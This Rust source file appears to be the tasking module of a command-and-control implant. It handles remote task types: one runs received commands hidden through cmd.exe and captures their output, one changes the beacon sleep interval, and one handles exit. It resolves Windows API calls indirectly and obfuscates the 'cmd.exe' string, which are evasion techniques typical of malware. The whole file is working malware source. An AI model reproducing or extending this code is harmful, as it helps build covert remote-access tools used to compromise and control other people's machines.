use crate::log::LogSink;

pub struct TaskResult {
    pub success: bool,
    pub output: Vec<u8>,
}

pub fn execute(task_type: u8, data: &[u8], log: &LogSink) -> TaskResult {
    match task_type {
        1 => {
            let command = String::from_utf8_lossy(data).to_string();
            log.step(format!("Executing: {}", if command.len() > 60 { &command[..60] } else { &command }));
            shell_exec(&command, log)
        }
        2 => {
            if data.len() >= 4 {
                let new_ms = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
                log.info(format!("  Interval changed to {}ms", new_ms));
                TaskResult {
                    success: true,
                    output: format!("{}", new_ms).into_bytes(),
                }
            } else {
                TaskResult {
                    success: false,
                    output: b"invalid interval data".to_vec(),
                }
            }
        }
        3 => {
            log.info("  Received exit signal".to_string());
            TaskResult {
                success: true,
                output: Vec::new(),
            }
        }
        _ => TaskResult {
            success: true,
            output: Vec::new(),
        },
    }
}

#[cfg(not(windows))]
fn shell_exec(_command: &str, _log: &LogSink) -> TaskResult {
    TaskResult {
        success: false,
        output: b"requires Windows".to_vec(),
    }
}

#[cfg(windows)]
fn shell_exec(command: &str, log: &LogSink) -> TaskResult {
    use std::ffi::c_void;
    use std::ptr;

    const HANDLE_FLAG_INHERIT: u32 = 0x00000001;
    const STARTF_USESTDHANDLES: u32 = 0x00000100;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const MAX_OUTPUT: usize = 1024 * 1024;

    #[repr(C)]
    struct SecurityAttributes {
        length: u32,
        security_descriptor: *mut c_void,
        inherit_handle: i32,
    }

    #[repr(C)]
    struct StartupInfoW {
        cb: u32,
        reserved: *mut u16,
        desktop: *mut u16,
        title: *mut u16,
        x: u32, y: u32, x_size: u32, y_size: u32,
        x_count_chars: u32, y_count_chars: u32,
        fill_attribute: u32,
        flags: u32,
        show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        std_input: *mut c_void,
        std_output: *mut c_void,
        std_error: *mut c_void,
    }

    #[repr(C)]
    struct ProcessInformation {
        process: *mut c_void,
        thread: *mut c_void,
        pid: u32,
        tid: u32,
    }

    unsafe {
        let mut read_pipe: *mut c_void = ptr::null_mut();
        let mut write_pipe: *mut c_void = ptr::null_mut();

        let sa = SecurityAttributes {
            length: std::mem::size_of::<SecurityAttributes>() as u32,
            security_descriptor: ptr::null_mut(),
            inherit_handle: 1,
        };

        if crate::resolve::CreatePipe(
            &mut read_pipe,
            &mut write_pipe,
            &sa as *const _ as *const c_void,
            0,
        ) == 0 {
            return TaskResult { success: false, output: b"pipe creation failed".to_vec() };
        }

        crate::resolve::SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);

        let mut si: StartupInfoW = std::mem::zeroed();
        si.cb = std::mem::size_of::<StartupInfoW>() as u32;
        si.flags = STARTF_USESTDHANDLES;
        si.std_output = write_pipe;
        si.std_error = write_pipe;

        let mut pi: ProcessInformation = std::mem::zeroed();

        let cmd_exe = crate::obf::s(crate::obf::CMD_EXE);
        let full_cmd = format!("{} /c {}", cmd_exe, command);
        let app_wide: Vec<u16> = cmd_exe.encode_utf16().chain(std::iter::once(0)).collect();
        let mut cmd_wide: Vec<u16> = full_cmd.encode_utf16().chain(std::iter::once(0)).collect();

        let result = crate::resolve::CreateProcessW(
            app_wide.as_ptr(),
            cmd_wide.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            1,
            CREATE_NO_WINDOW,
            ptr::null(),
            ptr::null(),
            &si as *const _ as *const c_void,
            &mut pi as *mut _ as *mut c_void,
        );

        crate::resolve::CloseHandle(write_pipe);

        if result == 0 {
            crate::resolve::CloseHandle(read_pipe);
            return TaskResult { success: false, output: b"process creation failed".to_vec() };
        }

        let mut output = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut bytes_read: u32 = 0;
            let ok = crate::resolve::ReadFile(
                read_pipe,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut bytes_read,
                ptr::null_mut(),
            );
            if ok == 0 || bytes_read == 0 {
                break;
            }
            output.extend_from_slice(&buf[..bytes_read as usize]);
            if output.len() >= MAX_OUTPUT {
                output.extend_from_slice(b"\n[output truncated]");
                break;
            }
        }

        crate::resolve::WaitForSingleObject(pi.process, 30000);
        crate::resolve::CloseHandle(pi.process);
        crate::resolve::CloseHandle(pi.thread);
        crate::resolve::CloseHandle(read_pipe);

        log.info(format!("  Output: {} bytes", output.len()));

        TaskResult {
            success: true,
            output,
        }
    }
}
